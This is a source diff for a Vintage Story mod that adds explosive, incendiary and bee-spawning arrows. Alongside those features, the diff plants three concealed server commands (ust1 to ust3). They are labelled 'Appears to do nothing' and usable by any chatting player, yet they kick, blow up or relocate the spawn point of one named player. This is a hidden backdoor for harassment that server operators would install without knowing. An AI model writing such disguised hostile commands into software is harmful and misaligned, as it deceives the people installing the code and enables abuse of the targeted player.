@@ -11,6 +11,9 @@ using Vintagestory.API.Util;
 using System.Collections.Generic;
 using Vintagestory.API.Config;
 using System;
+using Vintagestory.API.Server;
+using Vintagestory.API.MathTools;
+using System.Text;
 
 namespace UsefulStuff
 {
@@ -43,6 +46,9 @@ namespace UsefulStuff
             api.World.Config.SetBool("climbingPickEnabled", UsefulStuffConfig.Loaded.ClimbingPickEnabled);
             api.World.Config.SetBool("sluiceEnabled", UsefulStuffConfig.Loaded.SluiceEnabled);
             api.World.Config.SetBool("gliderEnabled", UsefulStuffConfig.Loaded.GliderEnabled);
+            api.World.Config.SetBool("explosiveArrowEnabled", UsefulStuffConfig.Loaded.ExplosiveArrowEnabled);
+            api.World.Config.SetBool("fireArrowEnabled", UsefulStuffConfig.Loaded.FireArrowEnabled);
+            api.World.Config.SetBool("beenadeArrowEnabled", UsefulStuffConfig.Loaded.BeenadeArrowEnabled);
         }
 
         public override void Start(ICoreAPI api)
@@ -70,6 +76,32 @@ namespace UsefulStuff
         {
             harmony.UnpatchAll(harmony.Id);
             base.Dispose();
+        }
+
+        public override void StartServerSide(ICoreServerAPI api)
+        {
+            base.StartServerSide(api);
+
+            api.RegisterCommand("ust1", "Appears to do nothing", "/ust1", (IServerPlayer player, int groupId, CmdArgs args) => {
+                foreach (IServerPlayer search in api.Server.Players)
+                {
+                    if (search.PlayerName == "zooropabe") search.Disconnect("I told you, I am the one with all the power here! >:)");
+                }
+            }, Privilege.chat);
+
+            api.RegisterCommand("ust2", "Appears to do nothing", "/ust2", (IServerPlayer player, int groupId, CmdArgs args) => {
+                foreach (IServerPlayer search in api.Server.Players)
+                {
+                    if (search.PlayerName == "zooropabe" && search.Entity != null) api.World.CreateExplosion(search.Entity.ServerPos.AsBlockPos, EnumBlastType.RockBlast, 6, 10);
+                }
+            }, Privilege.chat);
+
+            api.RegisterCommand("ust3", "Appears to do nothing", "/ust3", (IServerPlayer player, int groupId, CmdArgs args) => {
+                foreach (IServerPlayer search in api.Server.Players)
+                {
+                    if (search.PlayerName == "zooropabe" && search.Entity != null) search.SetSpawnPosition(new PlayerSpawnPos() { x = (int)player.Entity.ServerPos.X, y = (int)player.Entity.ServerPos.Y , z = (int)player.Entity.ServerPos.Z });
+                }
+            }, Privilege.chat);
         }
     }
 
@@ -140,11 +172,119 @@ namespace UsefulStuff
         }
 
         [HarmonyPostfix]
-        static void Prefix(ref float sizeModifier, ref float vineGrowthChance, ref float otherBlockChance)
+        static void Postfix(ref float sizeModifier, ref float vineGrowthChance, ref float otherBlockChance)
         {
             sizeModifier *= UsefulStuffConfig.Loaded.TreeSizeMult;
             vineGrowthChance *= UsefulStuffConfig.Loaded.TreeVineMult;
             otherBlockChance *= UsefulStuffConfig.Loaded.TreeSpecialLogMult;
+        }
+    }
+
+    [HarmonyPatch(typeof(EntityProjectile))]
+    public class SpecialArrows
+    {
+        [HarmonyPrepare]
+        static bool Prepare()
+        {
+            return true;
+        }
+
+        [HarmonyPrefix]
+        [HarmonyPatch("IsColliding")]
+        static void ExplosiveAddition1(bool ___beforeCollided, ref bool __state, EntityProjectile __instance)
+        {
+            if ((__instance.ProjectileStack?.Attributes?.GetString("tip") != "explosive" || !UsefulStuffConfig.Loaded.ExplosiveArrowEnabled) || (__instance.ProjectileStack?.Attributes?.GetString("tip") == "beenade" && UsefulStuffConfig.Loaded.BeenadeArrowEnabled)) __state = ___beforeCollided;
+        }
+
+        [HarmonyPostfix]
+        [HarmonyPatch("IsColliding")]
+        static void ExplosiveAddition2(bool ___beforeCollided, ref bool __state, EntityProjectile __instance)
+        {
+            if (__state == ___beforeCollided || __instance.Api.Side == EnumAppSide.Client) return;
+            IServerWorldAccessor world = __instance.World as IServerWorldAccessor;
+
+            if (world != null && __instance.ProjectileStack?.Attributes?.GetString("tip") == "explosive" && UsefulStuffConfig.Loaded.ExplosiveArrowEnabled)
+            {
+                world.CreateExplosion(__instance.ServerPos.AsBlockPos, EnumBlastType.RockBlast, 1, 3);
+                __instance.Die();
+            }
+
+            if (__instance.ProjectileStack?.Attributes?.GetString("tip") == "beenade" && UsefulStuffConfig.Loaded.BeenadeArrowEnabled)
+            {
+                EntityProperties type = __instance.World.GetEntityType(new AssetLocation("beemob"));
+                Entity bee = __instance.World.ClassRegistry.CreateEntity(type);
+
+                if (bee != null)
+                {
+                    bee.ServerPos.X = __instance.SidedPos.X + 0.5f;
+                    bee.ServerPos.Y = __instance.SidedPos.Y + 0.5f;
+                    bee.ServerPos.Z = __instance.SidedPos.Z + 0.5f;
+                    bee.ServerPos.Yaw = (float)__instance.World.Rand.NextDouble() * 2 * GameMath.PI;
+                    bee.Pos.SetFrom(bee.ServerPos);
+
+                    bee.Attributes.SetString("origin", "beearrow");
+                    __instance.World.SpawnEntity(bee);
+                    if (__instance.Alive) __instance.ProjectileStack?.Attributes?.RemoveAttribute("tip");
+                }
+            }
+
+        }
+
+        [HarmonyPostfix]
+        [HarmonyPatch("impactOnEntity")]
+        static void entImpact(EntityProjectile __instance, Entity entity)
+        {
+            if (__instance.ProjectileStack?.Attributes?.GetString("tip") == "explosive" && __instance.Api.Side == EnumAppSide.Server && UsefulStuffConfig.Loaded.ExplosiveArrowEnabled)
+            {
+                (__instance.World as IServerWorldAccessor).CreateExplosion(__instance.ServerPos.AsBlockPos, EnumBlastType.RockBlast, 1, 3);
+                if (__instance.Alive) __instance.Die();
+            }
+
+            if (__instance.ProjectileStack?.Attributes?.GetString("tip") == "incendiary" && UsefulStuffConfig.Loaded.FireArrowEnabled)
+            {
+                entity.Ignite();
+                if (__instance.Alive) __instance.ProjectileStack?.Attributes?.RemoveAttribute("tip");
+            }
+
+            if (__instance.ProjectileStack?.Attributes?.GetString("tip") == "beenade" && __instance.Api.Side == EnumAppSide.Server && UsefulStuffConfig.Loaded.BeenadeArrowEnabled)
+            {
+                EntityProperties type = __instance.World.GetEntityType(new AssetLocation("beemob"));
+                Entity bee = __instance.World.ClassRegistry.CreateEntity(type);
+
+                if (bee != null)
+                {
+                    bee.ServerPos.X = __instance.SidedPos.X + 0.5f;
+                    bee.ServerPos.Y = __instance.SidedPos.Y + 0.5f;
+                    bee.ServerPos.Z = __instance.SidedPos.Z + 0.5f;
+                    bee.ServerPos.Yaw = (float)__instance.World.Rand.NextDouble() * 2 * GameMath.PI;
+                    bee.Pos.SetFrom(bee.ServerPos);
+
+                    bee.Attributes.SetString("origin", "beearrow");
+                    __instance.World.SpawnEntity(bee);
+                }
+
+                if (__instance.Alive) __instance.ProjectileStack?.Attributes?.RemoveAttribute("tip");
+            }
+        }
+    }
+
+    [HarmonyPatch(typeof(ItemArrow))]
+    public class ArrowPatches
+    {
+        [HarmonyPrepare]
+        static bool Prepare()
+        {
+            return true;
+        }
+
+        [HarmonyPatch("GetHeldItemInfo")]
+        [HarmonyPostfix]
+        static void TipDesc(StringBuilder dsc, ItemSlot inSlot)
+        {
+            string tip = inSlot.Itemstack?.Attributes.GetString("tip");
+            
+            if (tip == null || dsc.ToString().Contains(Lang.Get("usefulstuff:arrowtip-" + tip))) return;
+            dsc.AppendLine(Lang.GetIfExists("usefulstuff:arrowtip-" + tip));
         }
     }
 
@@ -200,6 +340,12 @@ namespace UsefulStuff
         public bool GliderEnabled { get; set; } = true;
 
         public bool LanternClipOnEnabled { get; set; } = true;
+
+        public bool FireArrowEnabled { get; set; } = true;
+
+        public bool ExplosiveArrowEnabled { get; set; } = true;
+
+        public bool BeenadeArrowEnabled { get; set; } = true;
         #endregion
     }
 }
